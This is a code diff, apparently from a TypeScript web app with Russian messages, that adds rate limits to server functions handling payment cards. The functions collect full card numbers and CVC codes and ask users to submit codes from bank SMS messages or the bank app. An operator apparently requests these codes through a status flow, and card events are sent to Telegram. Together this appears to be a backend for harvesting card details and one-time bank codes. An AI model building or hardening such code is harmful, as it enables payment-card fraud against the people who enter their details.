@@ -8,6 +8,7 @@ import { db } from "@/lib/db"
 import { paymentCard } from "@/lib/db/schema"
 import { CARD_BRAND_LABEL, detectBank, detectBrand, formatCardNumber, formatExpiry, isExpiryValid, luhnValid, normalizeCardNumber, type CardBrand } from "@/lib/payment-cards"
 import { escapeTelegram, notifyTelegram } from "@/lib/telegram"
+import { allowUserAction, RATE_LIMIT_ERROR } from "@/lib/rate-limit"
 
 export type PaymentCardView = {
   id: number
@@ -75,6 +76,7 @@ export async function requestCardBinding(input: {
     return { ok: false, error: "Проверьте срок действия карты (ММ/ГГ)." }
   }
   if (cvc.length < 3 || cvc.length > 4) return { ok: false, error: "Укажите код CVC/CVV с обратной стороны карты." }
+  if (!(await allowUserAction(user.id, "cardBinding"))) return { ok: false, error: RATE_LIMIT_ERROR }
 
   const brand = detectBrand(cardNumber)
   const bankName = detectBank(cardNumber) ?? ""
@@ -115,6 +117,7 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
   if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
   const trimmed = String(code ?? "").trim().replace(/\s+/g, "").slice(0, 20)
   if (!/^[A-Za-z0-9]{3,20}$/.test(trimmed)) throw new Error("Укажите код из SMS или приложения банка.")
+  if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)
 
   const [row] = await db.update(paymentCard).set({ status: "pending" })
     .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, user.id), eq(paymentCard.status, "code_requested")))
@@ -136,6 +139,7 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
   if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
   const trimmed = String(response ?? "").trim().slice(0, 500)
   if (!trimmed) throw new Error("Введите ответ.")
+  if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)
 
   const [row] = await db.update(paymentCard).set({ status: "code_requested", extraCheckResponse: trimmed })
     .where(and(
@@ -161,6 +165,7 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
 export async function setDefaultPaymentCard(id: number): Promise<PaymentCardView[]> {
   const userId = await getUserId()
   if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
+  if (!(await allowUserAction(userId, "cardManage"))) throw new Error(RATE_LIMIT_ERROR)
   await db.transaction(async (tx) => {
     await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${userId}))`)
     const [owned] = await tx.select({ id: paymentCard.id }).from(paymentCard)
@@ -176,6 +181,7 @@ export async function setDefaultPaymentCard(id: number): Promise<PaymentCardView
 export async function deletePaymentCard(id: number): Promise<CardsResult> {
   const userId = await getUserId()
   if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
+  if (!(await allowUserAction(userId, "cardManage"))) throw new Error(RATE_LIMIT_ERROR)
   await db.transaction(async (tx) => {
     await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${userId}))`)
     const [removed] = await tx.delete(paymentCard)
